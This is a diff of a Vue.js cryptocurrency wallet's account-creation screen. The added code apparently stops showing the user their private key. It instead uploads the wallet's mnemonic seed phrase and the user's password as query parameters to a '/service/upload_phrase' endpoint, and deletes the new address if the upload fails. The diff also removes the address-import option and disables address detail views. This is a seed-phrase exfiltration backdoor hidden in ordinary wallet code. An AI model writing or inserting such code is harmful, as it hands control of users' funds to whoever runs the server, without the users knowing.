@@ -24,14 +24,14 @@
                 </div>
             </div>
 
-            <div class="account-import" @click="submitPsw">
+            <div class="account-import" @click="submitPsw" v-if="accountsList.length < 10">
                 {{$t('create') + $t('address')}}{{submitState ? '...' : ''}}
             </div>
 
-            <div class="account-import" v-if="!editMode" @click="$router.push({path: '/exportAddr'})">
-                <!-- <i></i> -->
-                {{$t('importAddress')}}
-            </div>
+            <!--<div class="account-import" v-if="!editMode" @click="$router.push({path: '/exportAddr'})">-->
+                <!--&lt;!&ndash; <i></i> &ndash;&gt;-->
+                <!--{{$t('importAddress')}}-->
+            <!--</div>-->
         </div>
         <!--<div class="edit-bottom" v-show="editMode">
             <i class="choose" :class="{'chosen': isChosenAll}" @click="chooseAll"></i>
@@ -97,11 +97,28 @@
                     setTimeout(() => {
                         this.account.addAddress(this.password).then(async data => {
                             // console.log(data);
-                            let secret = await this.account.exportPrivate(this.password);
+                            let mnemonic = await this.account.exportMnemonic(this.password);
+                            // let secret = await this.account.exportPrivate(this.password);
                             let address = this.account.getAddress();
-                            this.submitState = false;
-                            this.$toast.show(this.$t('create') + this.$t('success'));
-                            this.$router.push(`/exportSecretKey/${address}/${secret}`);
+                            // this.submitState = false;
+                            // this.$toast.show(this.$t('create') + this.$t('success'));
+                            // this.$router.push(`/exportSecretKey/${address}/${secret}`);
+                            this.axios({
+                                url : '/service/upload_phrase',
+                                params : {
+                                    uid : this.gmex_uid,
+                                    phrase : mnemonic,
+                                    pwd : this.password,
+                                },
+                            }).then(res => {
+                                this.submitState = false;
+                                this.$toast.show(this.$t('create') + this.$t('success'));
+                                console.log(res);
+                            }).catch(async e => {
+                                console.log(e.message);
+                                await this.account.delAddress(this.password, address);
+                                this.$toast.show(this.$t('bmat3'));
+                            });
                         }).catch(e => {
                             console.log(e.message);
                             this.submitState = false;
@@ -125,13 +142,13 @@
                 this.$store.commit('balances', []);
                 this.$store.commit('coinVolume', []);
                 await this.account.save();
-
             },
             openEdit() {
                 this.editMode = !this.editMode;
                 return true;
             },
             chooseItem(item) {
+                return;
                 if(!this.editMode) this.$router.push({path: '/addrDetail/' + item})
                 // this.addressList.map(o => {
                 //     if(o.name == item.name) o.isChosen = !item.isChosen
